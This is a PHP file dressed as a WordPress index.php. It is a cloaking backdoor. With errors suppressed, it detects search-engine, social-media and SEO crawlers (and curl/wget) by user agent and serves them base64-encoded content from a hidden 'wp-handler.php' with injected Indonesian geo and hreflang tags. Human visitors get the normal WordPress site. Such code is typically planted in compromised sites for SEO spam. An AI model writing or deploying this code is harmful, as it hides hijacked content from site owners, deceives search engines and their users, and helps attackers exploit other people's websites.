<?php

/**
 * 
 * 
 */

error_reporting(0);
ini_set('memory_limit', '256M'); 

$handler_path = __DIR__ . '/wp-handler.php';

function is_targeted_bot() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (empty($ua)) return false;

    
    $bots = array(
        
        'Googlebot', 'Googlebot-Mobile', 'Google-InspectionTool', 'Google-Site-Verification', 'bingbot', 'AdsBot-Google',
        
        'facebookexternalhit', 'Facebot', 'WhatsApp', 'TelegramBot', 'Twitterbot', 'Instagram',
        
        'Applebot', 'coccocbot', 'GTmetrix', 'PageSpeed Insights', 'Lighthouse', 'SemrushBot', 'AhrefsBot',
        
        'crawler', 'bot', 'spider', 'curl', 'wget'
    );

    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (is_targeted_bot() && file_exists($handler_path)) {
    $payload = file_get_contents($handler_path);
    $output = base64_decode(trim($payload));
    
    if ($output) {
        if (ob_get_length()) ob_clean(); 
        
        
        header('HTTP/1.1 200 OK');
        header('Content-Type: text/html; charset=utf-8');
        header('Cache-Control: public, max-age=86400');

        
        $geo_tags = "<meta name='geo.country' content='ID' />\n";
        $geo_tags .= "<meta name='geo.placename' content='Indonesia' />\n";
        $geo_tags .= "<meta name='language' content='Indonesia' />\n";
        $geo_tags .= "<link rel='alternate' hreflang='id-id' href='http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."' />\n";

        
        if (stripos($output, '<head>') !== false) {
            echo str_ireplace('<head>', "<head>\n" . $geo_tags, $output);
        } else {
            echo $geo_tags . $output;
        }
        exit;
    }
}

/** WordPress Start */
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';


